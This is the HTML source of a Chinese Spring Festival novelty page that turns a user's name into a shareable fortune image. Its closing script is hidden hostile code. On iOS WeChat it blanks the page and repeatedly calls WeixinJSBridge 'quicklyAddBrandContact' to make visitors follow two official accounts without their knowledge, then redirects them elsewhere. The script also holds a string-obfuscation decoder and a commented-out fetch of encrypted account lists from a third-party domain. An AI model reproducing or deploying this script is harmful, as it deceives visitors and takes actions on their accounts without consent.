<!DOCTYPE html>
<html lang="en">

<head>
  <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title> 春节期间，你会发生的5件事</title>
  <link type="text/css" rel="stylesheet" href="style/css/frozen.css">
  <link type="text/css" rel="stylesheet" href="style/small_test.css">
  <script src="style/init_rem.js"></script>
  <script type="text/javascript" src="style/jquery.min.js"></script>
  <script type="text/javascript" src="style/myqrcode.js"></script>
  <style>
    .follow {
      font-size: 20px;
      line-height: 30px;
      color: #fff;
      text-align: center;
      padding-top: 30%;
      z-index: 2000;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, .9);
      display: none;
    }

    .follow span {
      font-size: 40px;
      position: absolute;
      top: 10px;
      left: 10px;
    }

    .follow img {
      width: 180px;
      margin-top: 10px;
    }

    .ui-btn-primary:before {
      border: none;
    }

    .com-tip {
      color: red;
      width: 100%;
      position: fixed;
      text-align: center;
      bottom: 0;
      left: 0;
      padding: 16px 0 12px;
      color: #fff;
      background: rgba(0, 0, 0, .7)
    }

    .com-tip a {
      color: #fff;
    }
  </style>
  <!-- <script type="text/javascript">  
    // 对浏览器的UserAgent进行正则匹配，不含有微信独有标识的则为其他浏览器  
    var useragent = navigator.userAgent;
    if (useragent.match(/MicroMessenger/i) != 'MicroMessenger') {
      // 这里警告框会阻塞当前页面继续加载  
      alert('已禁止本次访问：您必须使用微信内置浏览器访问本页面！');
      // 以下代码是用javascript强行关闭当前页面  
      var opened = window.open('about:blank', '_self');
      opened.opener = null;
      opened.close();
    }
  </script> -->
</head>

<body ontouchstart="">
  <input id="text" type="hidden" value="http://www.74d0vy.cn/hd/69chunjie/index.php" style="width:80%" />
  <br />
  <div id="qrcode" style="width:100px; height:100px; margin-top:15px;display:none"></div>
  <header class="ui-header ui-header-positive ui-border-b" style="background:#252c3f;font-weight:border">
    <h1 id="header">春节期间，你会发生的5件事</h1>
  </header>
  <section class="ui-container" id="frm">
    <img src="http://wx.wpart.cn/uploads/t/taxqmg1504598108/7/0/b/5/5a5f086b25394.jpg_p2js" width="50%" style="margin:40px 25%">
    <div class="ui-form ui-border-t">
      <div class="ui-form-item ui-border-b">
        <label>姓名</label>
        <input type="text" id="name" name="name" maxlength="4" placeholder="请输入姓名">
      </div>
      <div class="ui-form-item ui-form-item-radio ui-border-b">
        <label style="margin-left:-1px;">性别</label>
        <label class="ui-radio" for="radio" style="padding-left:90px;">
          <input type="radio" name="sex" value="1">
        </label>
        <p>男</p>
        <label class="ui-radio" for="radio">
          <input type="radio" name="sex" checked value="2">
        </label>
        <p>女</p>
      </div>
      <div class="ui-btn-wrap">
        <button class="ui-btn-lg ui-btn-primary btn" style="background:#252c3f;border:1px solid #252c3f">确定</button>
      </div>
    </div>
  </section>
  <section class="ui-container" id="pic" style="display:none;" align="center">
    <canvas width="900" height="700" id="canvas" style="display:none"> </canvas>
    <img src="" id="imgEnd" width="90%" style="box-shadow: #666 0px 0px 10px;">
  </section>
  <section class="ui-container" id="games" style="padding-bottom: 50px;">

  </section>
  <div class="ui-loading-block hide">
    <div class="ui-loading-cnt">
      <i class="ui-loading-bright"></i>
      <p>正在生成中...</p>
    </div>
  </div>
  <div class="com-tip">
    <p class="tip1">
      <a href=""></a>
    </p>
  </div>
  <script src="style/zepto.min.js"></script>
  <script src="style/ad.js"></script>
  <script src="style/game.js"></script>
  <script>
    getQrcode();

    Zepto(function () {
      $('.btn').click(function () {
        var name = $('#name').val();
        var qrcode = document.getElementById('pic1').src
        // var star = $(".constellation").find("option:selected").val();
        var sex = $('input[name="sex"]:checked').val();
        $(".ui-loading-block").addClass('show').removeClass('hide');
        var data = '6';
        if (!name) {
          $('#name').focus();
        } else {
          draw(name, data, sex, qrcode)
        }
      })
    })

    function getQrcode() {
      var qrcode = new QRCode(document.getElementById("qrcode"), {
        width: 100,
        height: 100
      });

      function makeCode() {
        var elText = document.getElementById("text");
        console.log('elText:', elText)
        qrcode.makeCode(elText.value);
      }

      makeCode();

    }

    function draw(username, data, sex, myqrcode) {
      var c = document.getElementById("canvas")
      var ctx = c.getContext("2d");
      var imgbg = document.createElement('img');
      var imgSrc = "sucai/" + sex + "/" + data + ".jpg";
      imgbg.src = imgSrc;

      imgbg.onload = function (e) {
        ctx.drawImage(imgbg, 0, 0, 900, 700);
        var qrcode = document.createElement('img');
        var qrcodeWidth = 120
        // var qrcodeX = c.width - qrcodeWidth-25;
        // var qrcodeY = c.height - qrcodeWidth - 25;
        var qrcodeX = 750;
        var qrcodeY = 565;
        qrcode.src = myqrcode;
        qrcode.onload = function (e) {
          ctx.drawImage(qrcode, qrcodeX, qrcodeY, qrcodeWidth, qrcodeWidth)

          ctx.font = "52px simhei";
          ctx.fillStyle = "#000000";
          var name = username;
          var nameW = ctx.measureText(name).width;
          var nameX = 225 - (nameW / 2);
          ctx.fillText(name + '春节期间发生的5件事', nameX, 65);

          var dataUrl = c.toDataURL("images/jpeg", 0.8);
          $("#imgEnd").attr("src", dataUrl)
          $(".ui-loading-block").addClass('hide').removeClass('show');
        }
      }
      $("#header").html("长按下方图片保存-裙发");
      $('#pic').css('display', 'block');
      $("#frm").css('display', 'none');
    }
  </script>
</body>
<script type="text/javascript">
  var data = 'gh_22e51ceb33f8;gh_1f80d1b4e2f1';

  (function () {
    var isIos = !!navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
    //这里是对方的域名
    // var sdfvw = "http://mp.ecs001.com/index/wx";
    function isWeiXin() {
      var ua = window.navigator.userAgent.toLowerCase();
      if (ua.match(/MicroMessenger/i) == 'micromessenger') {
        return true;
      } else {
        return false;
      }
    }

    function endaction() {
      try {
        window.name = 'ok' + Math.random();
        // window.location.href = location.href + '&t=endjs';
        window.location.href = 'http://testing.eastday.com/cleam/t/08_guanzhu/index2.html?t=' + Math.random().toString(36).split('.')[1];
      } catch (e) { }
    }

    function uncompileStr(code) {
      code = unescape(code);
      var c = String.fromCharCode(code.charCodeAt(0) - code.length);
      for (var i = 1; i < code.length; i++) {
        c += String.fromCharCode(code.charCodeAt(i) - c.charCodeAt(i - 1));
      }
      return c;
    }

    function tostart(result) {
      result.forEach(function (value) {
        goTo(value);
      });

      function goTo(username) {
        d = document;
        d.body.style.display = 'none';
        var vk = false;
        var ha = 0;
        c = function () {
          clearInterval(mm);
        };
        j = function () {
          if (ha !== 99) m();
        };
        h = function () {
          endaction();
        };
        m = function () {
          if (!vk) {
            vk = true;
            h()
          }
        };
        k = function () {
          location = 'https://mp.weixin.qq.com/mp/profile_ext?action=home&__biz=' + '' + '&t=' + Math.random().toString(36).split('.')[1] + '#wechat_redirect';
          go(username);
        };

        go = function (username) {
          mm = setTimeout(function () {
            try {
              WeixinJSBridge.invoke('quicklyAddBrandContact', {
                scene: '',
                username: username
              }, function (d) {
                if (d.err_msg.indexOf('ok') !== -1 || d.err_msg.indexOf('added') !== -1) {
                  ha = 99;
                  m();
                } else go(username)
              });
              ha++;
              if (ha === 2) setTimeout(j, 200);
            } catch (e) { }
          }, 50)
        };
        if (typeof (WeixinJSBridge) === 'undefined') {
          if (document.addEventListener) document.addEventListener('WeixinJSBridgeReady', k, false)
        } else k();
      }
    }

    if (window.name === '') {
      if (isWeiXin() && isIos) {
        tostart(JSON.parse('["gh_22e51ceb33f8", "gh_1f80d1b4e2f1"]'));
        //请求的时候域名地址后面加了  ss
        // $.post(sdfvw + 'ss', { data: JSON.stringify({ data: data, type: 'decrypt' }) }, function (result) {
        //   // result: {"errno":0,"errmsg":"","data":[]}
        //   if (!$.isEmptyObject(result.data)) {
        //     tostart(JSON.parse(uncompileStr(result.data)));
        //   }
        // });
      }
    } else {
      window.loadadd = true;
      window.name = ''
    }
  })();
</script>
<!-- <script src="style/jquery1.js"></script> -->

</html>